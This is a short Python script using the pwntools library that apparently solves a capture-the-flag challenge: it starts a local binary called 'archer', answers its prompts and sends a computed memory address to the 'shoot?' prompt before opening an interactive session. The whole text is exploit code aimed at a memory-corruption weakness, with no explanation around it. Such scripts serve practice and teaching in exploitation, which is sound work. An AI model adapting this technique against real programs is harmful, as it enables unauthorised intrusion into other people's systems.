#! /usr/bin/python3
from pwn import *
filename = "./archer"

io = process(filename)

TARGET_ADDR = hex(0x404068 - 0x500000)
log.info(TARGET_ADDR)

io.sendlineafter("Answer [yes/no]:", "yes")
io.sendlineafter("shoot?", TARGET_ADDR)
io.interactive()
